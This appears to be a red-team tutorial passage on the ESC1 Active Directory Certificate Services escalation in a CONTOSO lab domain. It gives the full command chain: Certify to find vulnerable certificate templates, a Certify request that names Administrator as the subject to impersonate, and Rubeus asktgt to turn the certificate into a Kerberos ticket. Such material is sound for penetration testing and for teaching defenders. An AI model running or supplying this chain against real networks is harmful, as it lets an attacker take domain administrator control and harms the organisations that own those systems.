The ESC1 privilege escalation vulnerability occurs when an attacker can enroll for a certificate that has an EKU that enables client authentication, and where the subject information can be supplied by the requestor.

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

From the output above, we can see that:

- The **ENROLLEE_SUPPLIES_SUBJECT** flag is set.  This means that the certificate's subject information will be provided by the requestor, rather than being populated from Active Directory.
- _Manager Approval Required_ is set to False and _Authorized Signatures Required_ is set to 0.  This means no manual intervention is required to obtain a certificate from this template.
- _Client Authentication_ is enabled in the Extended Key Usage (EKU).  Other viable EKUs include _PKINIT Client Authentication_, _Smart Card Logon_, _Any Purpose_, _Subordinate CA_, and a blank/empty EKU field.
- CONTOSO\Domain Users have enrollment rights.

To exploit this, use Certify's `request` command.
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```
Where:

- `--ca` is the target CA for the certificate request.
- `--template` is the certificate template to request.
- `--upn` is the Subject Alternative Name (SAN) for the certificate request.  This is where we specify the user to impersonate.

The output will be a base64 encoded certificate in PFX format, which can be used with Rubeus' `asktgt` command.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:MIACAPQBjAG8AbQAsAEQAQwA9AGMAbwBuAHQAbwBzAG8ALABDAE4APQBVAHMAZQByAHMALABDAE4APQBQAG8AbABsAHkAIABDAGgAaQBsAGQAcwAAAAAAAAAAAAAAAAAAAAA= /enctype:aes256 /nowrap
```
